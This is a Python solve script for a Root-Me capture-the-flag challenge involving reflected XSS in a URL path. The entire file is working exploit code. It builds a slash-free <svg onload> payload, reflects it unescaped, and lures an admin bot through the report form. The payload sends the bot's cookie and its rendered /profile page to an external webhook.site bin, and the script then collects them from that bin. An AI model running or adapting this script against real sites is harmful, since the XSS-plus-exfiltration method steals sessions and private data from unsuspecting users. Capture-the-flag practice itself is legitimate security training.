#!/usr/bin/env python3
"""
Root-Me Pro - "XSS - Reflected - URI" (app title: XSS - Reflected 2)

/forum/<uuid> reflects the unmatched uuid into the 404 page with zero escaping,
and that same page carries a Report button whose POST /forum/report makes an
admin bot visit any URL you hand it.

The only real constraint is that the payload sits in a PATH SEGMENT, so Werkzeug
307-redirects on any '/' or '\\' (raw or percent-encoded) before routing happens.
Slashes therefore have to be built at runtime with String.fromCharCode(47).

Usage:
    python3 solve.py https://instance-xxxx.challenges.root-me.pro
"""

import json
import re
import sys
import time
import urllib.parse

import requests

REPORT_COMMENT = "Broken thread link, please check"


def make_catcher() -> str:
    """Spin up a throwaway webhook.site bin and return its token."""
    r = requests.post("https://webhook.site/token", json={}, timeout=20)
    r.raise_for_status()
    return r.json()["uuid"]


def build_payload(token: str) -> str:
    """Slash-free <svg onload> that exfils the cookie AND the rendered /profile.

    Stage 2 matters: the bot's session expires within minutes, so a stolen
    cookie is often dead by the time you replay it. Reading /profile inside the
    admin's own browser sidesteps both that and HttpOnly.
    """
    js = (
        "s=String.fromCharCode(47);"
        f"u='https:'+s+s+'webhook.site'+s+'{token}';"
        "fetch(u+'?c='+encodeURIComponent(document.cookie));"
        "fetch(s+'profile').then(r=>r.text()).then(t=>fetch(u+'?p=1',"
        "{method:'POST',body:t}))"
    )
    payload = f'<svg onload="{js}">'
    # Werkzeug normalises backslash to slash, so both are fatal.
    assert "/" not in payload and "\\" not in payload, "slash leaked into payload"
    return payload


def deliver(target: str, payload: str) -> str:
    url = f"{target.rstrip('/')}/forum/" + urllib.parse.quote(payload, safe="")

    # Sanity-check the reflection survived intact before waking the bot.
    probe = requests.get(url, timeout=20)
    if probe.status_code == 307:
        sys.exit("[-] 307 - a '/' or '\\' reached the path, route never matched")
    if payload not in probe.text:
        sys.exit("[-] payload did not reflect verbatim")
    print(f"[+] reflected unescaped ({probe.status_code})")

    r = requests.post(
        f"{target.rstrip('/')}/forum/report",
        data={"url": url, "comment": REPORT_COMMENT},
        allow_redirects=False,
        timeout=30,
    )
    print(f"[+] reported to admin ({r.status_code} -> {r.headers.get('location')})")
    return url


def collect(token: str, tries: int = 12, delay: int = 5):
    api = f"https://webhook.site/token/{token}/requests?sorting=newest&per_page=20"
    for i in range(tries):
        data = requests.get(api, timeout=20).json()
        if data.get("total"):
            return data["data"]
        print(f"[.] waiting for bot ({i + 1}/{tries})")
        time.sleep(delay)
    sys.exit("[-] bot never called back")


def main():
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    target = sys.argv[1]

    token = make_catcher()
    print(f"[*] catcher: https://webhook.site/{token}")

    deliver(target, build_payload(token))

    for req in collect(token):
        if req["method"] == "GET":
            cookie = (req.get("query") or {}).get("c", "")
            if cookie:
                print(f"[+] admin cookie: {cookie}")
        elif req["method"] == "POST":
            body = req.get("content") or ""
            flag = re.search(r"RM\{[^}]*\}", body)
            if flag:
                print(f"[+] FLAG: {flag.group(0)}")
            else:
                print(f"[!] no flag in {len(body)} bytes of /profile")


if __name__ == "__main__":
    main()
